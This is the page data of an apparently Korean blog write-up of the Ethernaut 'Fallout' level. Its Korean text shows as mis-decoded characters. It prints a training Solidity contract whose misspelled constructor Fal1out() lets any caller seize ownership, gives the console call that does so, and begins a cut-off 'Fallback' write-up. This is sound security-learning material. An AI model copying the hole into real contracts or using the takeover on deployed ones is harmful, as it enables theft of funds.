{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/ethernaut/2_fallout_ethernaut/2_fallout_ethernaut/",
    "result": {"data":{"cur":{"id":"9c0241f5-49d5-5014-8924-fca54d0e570d","html":"<h1 id=\"-1-fallout\" style=\"position:relative;\"><a href=\"#-1-fallout\" aria-label=\" 1 fallout permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ğŸ‘‹ 1. Fallout</h1>\n<p><strong>Difficulty 2/10</strong></p>\n<ul>\n<li>ìŠ¹ë¦¬ ì¡°ê±´</li>\n<li>ì½”ë“œ ë¶„ì„</li>\n<li>í’€ì´</li>\n</ul>\n<p>ìˆœì„œë¡œ ì§„í–‰ ë  ê²ƒì´ë‹¤.</p>\n<hr>\n<h2 id=\"ìŠ¹ë¦¬-ì¡°ê±´\" style=\"position:relative;\"><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\" aria-label=\"ìŠ¹ë¦¬ ì¡°ê±´ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ìŠ¹ë¦¬ ì¡°ê±´</h2>\n<ul>\n<li>contractì˜ ownershipì„ ëºì–´ì˜¤ê¸°</li>\n</ul>\n<hr>\n<h2 id=\"ì½”ë“œ-ë¶„ì„\" style=\"position:relative;\"><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\" aria-label=\"ì½”ë“œ ë¶„ì„ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ì½”ë“œ ë¶„ì„</h2>\n<p>ì‚¬ì‹¤ falloutì—ì„œëŠ” ì½”ë“œë¥¼ ë¶„ì„ í•  í•„ìš”ê°€ ì—†ë‹¤.\r\ní•œë²ˆ ì½”ë“œë¥¼ ì½ì–´ë³´ê³  ë°‘ìœ¼ë¡œ!!</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\r\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\r\n\r\n<span class=\"token keyword\">import</span> <span class=\"token string\">'@openzeppelin/contracts/math/SafeMath.sol'</span><span class=\"token punctuation\">;</span>\r\n\r\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Fallout</span> <span class=\"token punctuation\">{</span>\r\n  \r\n  <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> allocations<span class=\"token punctuation\">;</span>\r\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\r\n\r\n\r\n  <span class=\"token comment\">/* constructor */</span>\r\n  <span class=\"token keyword\">function</span> <span class=\"token function\">Fal1out</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\r\n    owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\r\n    allocations<span class=\"token punctuation\">[</span>owner<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\r\n  <span class=\"token punctuation\">}</span>\r\n\r\n  <span class=\"token keyword\">modifier</span> onlyOwner <span class=\"token punctuation\">{</span>\r\n\t        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\r\n\t            msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> owner<span class=\"token punctuation\">,</span>\r\n\t            <span class=\"token string\">\"caller is not the owner\"</span>\r\n\t        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\t        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\r\n\t    <span class=\"token punctuation\">}</span>\r\n\r\n  <span class=\"token keyword\">function</span> <span class=\"token function\">allocate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\r\n    allocations<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> allocations<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token punctuation\">}</span>\r\n\r\n  <span class=\"token keyword\">function</span> <span class=\"token function\">sendAllocation</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> allocator<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>allocations<span class=\"token punctuation\">[</span>allocator<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    allocator<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>allocations<span class=\"token punctuation\">[</span>allocator<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token punctuation\">}</span>\r\n\r\n  <span class=\"token keyword\">function</span> <span class=\"token function\">collectAllocations</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> onlyOwner <span class=\"token punctuation\">{</span>\r\n    msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token punctuation\">}</span>\r\n\r\n  <span class=\"token keyword\">function</span> <span class=\"token function\">allocatorBalance</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> allocator<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n    <span class=\"token keyword\">return</span> allocations<span class=\"token punctuation\">[</span>allocator<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token punctuation\">}</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<hr>\n<h2 id=\"í’€ì´\" style=\"position:relative;\"><a href=\"#%ED%92%80%EC%9D%B4\" aria-label=\"í’€ì´ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>í’€ì´</h2>\n<p>ìš°ë¦¬ì˜ ë¬¸ì œëŠ” <strong>â€œcontractì˜ ownershipì„ ëºì–´ì˜¤ê¸°â€</strong> ì´ë‹¤.</p>\n<p>Contractë¥¼ ìì„¸íˆ ë³´ë©´ constructorì— ì˜¤íƒ€ê°€ ìˆëŠ” ê²ƒìœ¼ë¡œ ë³´ì¸ë‹¤.\r\nê·¸ë ‡ê²Œë˜ë©´ ìš°ë¦¬ëŠ” Fal1out()ì„ callí•¨ìœ¼ë¡œì¨ ownershipì„ ê°€ì ¸ì˜¬ ìˆ˜ ìˆë‹¤</p>\n<p>ëª¨ë“  ì½”ë“œëŠ” consoleì°½ì—ì„œ ì´ë£¨ì–´ì§„ë‹¤.\r\nctrl + shift + ië¥¼ ëˆŒëŸ¬ consoleì°½ì„ í™œì„±í™” ì‹œí‚¤ì</p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token comment\">//ì˜¤íƒ€ê°€ ìˆëŠ” Fal1out()ì„ callí•œë‹¤.</span>\r\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">Fal1out</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token comment\">//contractì˜ owner addressë¥¼ í™•ì¸í•œë‹¤.</span>\r\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">owner</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token comment\">//ë‚˜ì˜ addressë¥¼ í™•ì¸í•œë‹¤.</span>\r\nplayer\r\n<span class=\"token comment\">//play(ë‚˜)ì´ ownerê°€ ëœ ê²ƒì„ í™•ì¸ í•  ìˆ˜ ìˆë‹¤.</span></code></pre></div>\n<p>ì™„ë£Œ í›„ Submit instanceë¥¼ ëˆ„ë¥´ê³  ì¡°ê¸ˆ ê¸°ë‹¤ë¦¬ë©´ blockì´ mineë˜ê³ ,</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">Ù©(- Ì®Ì®Ìƒ-Ìƒ)Û¶ Well done, You have completed this level!!!</code></pre></div>\n<h2 id=\"ë¶€ê°€ì„¤ëª…\" style=\"position:relative;\"><a href=\"#%EB%B6%80%EA%B0%80%EC%84%A4%EB%AA%85\" aria-label=\"ë¶€ê°€ì„¤ëª… permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ë¶€ê°€ì„¤ëª…</h2>\n<p>ì›ë˜ constructorëŠ” ì•„ë˜ì™€ ê°™ì´ contractì˜ ì´ë¦„ê³¼ ë™ì¼í•˜ê²Œ ì‚¬ìš©í–ˆë‹¤.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">A</span> <span class=\"token punctuation\">{</span>\r\n  <span class=\"token keyword\">function</span> <span class=\"token function\">A</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span>  <span class=\"token punctuation\">{</span>\r\n  <span class=\"token punctuation\">}</span></code></pre></div>\n<p>í•˜ì§€ë§Œ Solidity v0.5.0ì—ì„œ constructorëŠ” â€˜constructorâ€™ í‚¤ì›Œë“œë¥¼ ì‚¬ìš©í•´ì•¼í•˜ëŠ” ê²ƒìœ¼ë¡œ ë°”ë€Œì—ˆë‹¤.</p>\n<hr>\n<h2 id=\"ë§ˆë¬´ë¦¬\" style=\"position:relative;\"><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\" aria-label=\"ë§ˆë¬´ë¦¬ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ë§ˆë¬´ë¦¬</h2>\n<p>ë‚˜ëŠ” ì²˜ìŒì— Fal1out()ì—ì„œ ì˜¤íƒ€ë¥¼ ë°œê²¬í•˜ê³  ì‚¬ëŒì´ë‹ˆê¹ ì‹¤ìˆ˜ í•  ìˆ˜ ìˆì§€â€¦ í•˜ë©° ë„˜ê²¼ë‹¤. <del>constructorë¼ê³ ë„ ì¹œì ˆíˆ ì¨ì£¼ì…”ì„œ ë‹¹ì—°íˆ ì˜¤íƒ€ì¸ì¤„^^</del>` ê·¸ë˜ì„œ ë‹¤ë¥¸ functionë“¤ì„ ë¶„ì„í•´ë³´ë©° ì–´ë–»ê²Œ ownershipì„ ê°€ì ¸ì˜¬ ìˆ˜ ìˆì„ê¹Œí•˜ë©° 10ë¶„ ì´ìƒì„ ë³´ë‚¸ ê²ƒ ê°™ë‹¤ã…‹ã…‹ ê·¸ëŸ¬ë‹¤ ë¬¸ë“ ì„¤ë§ˆ ì €ê²Œ ì˜¤íƒ€ê°€ ì•„ë‹ê¹Œ?í•˜ê³  ë°”ë¡œ consoleì°½ì— Fal1out()ì„ call í–ˆë‹¤. ê·¼ë° ì•„ë‹ˆë‚˜ë‹¤ë¥¼ê¹Œ ë°”ë¡œ í•´ê²° ë˜ë²„ë ¸ë‹¤ã… ã… \r\nì•„ë§ˆ ì´ë²ˆ ë¬¸ì œì—ì„œëŠ” ì˜¤íƒ€ í•˜ë‚˜ê°€ smart contractë¥¼ ë¶ˆì•ˆì „í•˜ê²Œ ë§Œë“¤ ìˆ˜ ìˆë‹¤ëŠ” êµí›ˆì„ ì£¼ëŠ” ê²ƒ ê°™ë‹¤. ë¬¸ì œë¥¼ í’€ë©´ ì‹¤ì œ ì˜¤íƒ€ë¡œ ì¸í•´ ì¼ì–´ë‚¬ë˜ ì‚¬ê³ ì˜ ì˜ˆì‹œë¥¼ ë³´ì—¬ì£¼ë‹ˆ í™•ì¸í•´ì! ê·¸ë¦¬ê³  ì ˆëŒ€ ì˜¤íƒ€ë¥¼ ë§Œë“¤ì§€ ë§ì!!</p>\n<hr>\n<h2 id=\"ê¸°íƒ€-ì •ë³´\" style=\"position:relative;\"><a href=\"#%EA%B8%B0%ED%83%80-%EC%A0%95%EB%B3%B4\" aria-label=\"ê¸°íƒ€ ì •ë³´ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ê¸°íƒ€ ì •ë³´</h2>\n<ul>\n<li>rinkeyb network ether faucet: <a href=\"https://faucets.chain.link/rinkeby\">https://faucets.chain.link/rinkeby</a></li>\n<li>ethernaut: <a href=\"https://ethernaut.openzeppelin.com/\">https://ethernaut.openzeppelin.com/</a></li>\n<li>Solidity v0.5.0 Breaking Changes: <a href=\"https://docs.soliditylang.org/en/v0.8.10/050-breaking-changes.html#deprecated-elements\">https://docs.soliditylang.org/en/v0.8.10/050-breaking-changes.html#deprecated-elements</a></li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\">ìŠ¹ë¦¬ ì¡°ê±´</a></li>\n<li><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\">ì½”ë“œ ë¶„ì„</a></li>\n<li><a href=\"#%ED%92%80%EC%9D%B4\">í’€ì´</a></li>\n<li><a href=\"#%EB%B6%80%EA%B0%80%EC%84%A4%EB%AA%85\">ë¶€ê°€ì„¤ëª…</a></li>\n<li><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\">ë§ˆë¬´ë¦¬</a></li>\n<li><a href=\"#%EA%B8%B0%ED%83%80-%EC%A0%95%EB%B3%B4\">ê¸°íƒ€ ì •ë³´</a></li>\n</ul>\n</div>","excerpt":"ğŸ‘‹ 1. Fallout Difficulty 2/10 ìŠ¹ë¦¬ ì¡°ê±´ ì½”ë“œ ë¶„ì„ í’€ì´ ìˆœì„œë¡œ ì§„í–‰ ë  ê²ƒì´ë‹¤. ìŠ¹ë¦¬ ì¡°ê±´ contractì˜ ownershipì„ ëºì–´ì˜¤ê¸° ì½”ë“œ ë¶„ì„ ì‚¬ì‹¤ falloutì—ì„œëŠ” ì½”ë“œë¥¼ ë¶„ì„ í•  í•„ìš”ê°€ ì—†ë‹¤.\r\ní•œë²ˆ ì½”ë“œë¥¼ ì½ì–´ë³´ê³  ë°‘ìœ¼ë¡œ!! í’€ì´ ìš°ë¦¬ì˜ ë¬¸ì œëŠ” â€œcontractì˜ ownershipì„ ëºì–´ì˜¤ê¸°â€ ì´ë‹¤. Contractë¥¼ ìì„¸íˆ ë³´ë©´ constructorì— ì˜¤íƒ€ê°€ ìˆëŠ” ê²ƒìœ¼ë¡œ ë³´ì¸ë‹¤.\r\nê·¸ë ‡ê²Œë˜ë©´ ìš°ë¦¬ëŠ” Fal1out()ì„ callí•¨ìœ¼ë¡œì¨ ownershipì„ ê°€ì ¸ì˜¬ ìˆ˜ ìˆë‹¤ ëª¨ë“  ì½”ë“œëŠ” consoleì°½ì—ì„œ ì´ë£¨ì–´ì§„ë‹¤.\r\nctrl + shift + ië¥¼ ëˆŒëŸ¬ consoleì°½ì„ í™œì„±í™” ì‹œí‚¤ì ì™„ë£Œ í›„ Submit instanceë¥¼ ëˆ„ë¥´ê³  ì¡°ê¸ˆ ê¸°ë‹¤ë¦¬ë©´ blockì´ mineë˜ê³ , ë¶€ê°€ì„¤ëª… ì›ë˜ constructorëŠ” ì•„ë˜ì™€ ê°™ì´ contractì˜ ì´ë¦„ê³¼ ë™ì¼í•˜ê²Œ ì‚¬ìš©í–ˆë‹¤. í•˜ì§€ë§Œ Solidity v0.5.0ì—ì„œ constructorëŠ” â€˜constructoâ€¦","frontmatter":{"date":"January 02, 2022","title":"(Ethernaut ì·¨ì•½ì  2) Fallout","categories":"ì·¨ì•½ì ë¶„ì„","author":"í•œì„±ì›","emoji":"ğŸ§¢"},"fields":{"slug":"/ethernaut/2_fallout_ethernaut/2_fallout_ethernaut/"}},"next":{"id":"aa96c6ad-2cfb-55c0-b0df-585740dd9f33","html":"<h1 id=\"-1-fallback\" style=\"position:relative;\"><a href=\"#-1-fallback\" aria-label=\" 1 fallback permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ğŸ‘‹ 1. Fallback</h1>\n<p><strong>Difficulty 1/10</strong></p>\n<p>ì§ì ‘ í‘¼ Ethernauts í’€ì´ë¥¼ ì ì–´ë³´ë ¤ê³  í•œë‹¤. ì·¨ì•½ì ì— ê³µë¶€í–ˆë˜ ì·¨ì•½ì ì„ ì‹¤ì œë¡œ ê³µê²©í•´ë³´ë©° ë³µìŠµ ë° ì‹¤ìŠµì„ í•´ë³¼ìˆ˜ ìˆì–´ ì¢‹ì€ ê²ƒ ê°™ë‹¤.</p>\n<ul>\n<li>ìŠ¹ë¦¬ ì¡°ê±´</li>\n<li>ì½”ë“œ ë¶„ì„</li>\n<li>í’€ì´</li>\n</ul>\n<p>ìˆœì„œë¡œ ì§„í–‰ ë  ê²ƒì´ë‹¤.</p>\n<hr>\n<h2 id=\"ìŠ¹ë¦¬-ì¡°ê±´\" style=\"position:relative;\"><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\" aria-label=\"ìŠ¹ë¦¬ ì¡°ê±´ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ìŠ¹ë¦¬ ì¡°ê±´</h2>\n<ul>\n<li>contractì˜ ownershipì„ ëºì–´ì˜¤ê¸°</li>\n<li>contractì˜ balanceë¥¼ 0ìœ¼ë¡œ ë§Œë“¤ê¸°</li>\n</ul>\n<hr>\n<h2 id=\"ì½”ë“œ-ë¶„ì„\" style=\"position:relative;\"><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\" aria-label=\"ì½”ë“œ ë¶„ì„ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ì½”ë“œ ë¶„ì„</h2>\n<p>ë¶„ì„ì€ ì£¼ì„ì—!</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\r\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\r\n\r\n<span class=\"token keyword\">import</span> <span class=\"token string\">'@openzeppelin/contracts/math/SafeMath.sol'</span><span class=\"token punctuation\">;</span>\r\n\r\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Fallback</span> <span class=\"token punctuation\">{</span>\r\n\r\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token comment\">// ê°ê°ì˜ addressë‹¹ ether ê¸°ì—¬ë„(contribution)</span>\r\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> contributions<span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token comment\">// Fallback Contractì˜ owner address</span>\r\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token comment\">//constructor</span>\r\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n        <span class=\"token comment\">// Deployerë¥¼ ownerë¡œ ì„¤ì •</span>\r\n        owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token comment\">// Deployerì˜ ê¸°ì—¬ë„ë¥¼ 1000 etherë¡œ ì„¤ì •</span>\r\n        contributions<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1000</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token comment\">//Ownerë§Œ ì‚¬ìš©í•  ìˆ˜ ìˆê²Œí•˜ëŠ” modifier</span>\r\n    <span class=\"token keyword\">modifier</span> onlyOwner <span class=\"token punctuation\">{</span>\r\n            <span class=\"token comment\">// msg.senderê°€ ownerì¸ì§€ ì•„ë‹Œì§€ í™•ì¸</span>\r\n            <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\r\n                msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> owner<span class=\"token punctuation\">,</span>\r\n                <span class=\"token string\">\"caller is not the owner\"</span>\r\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n            <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token comment\">//contractì˜ ê¸°ì—¬ë„ë¥¼ 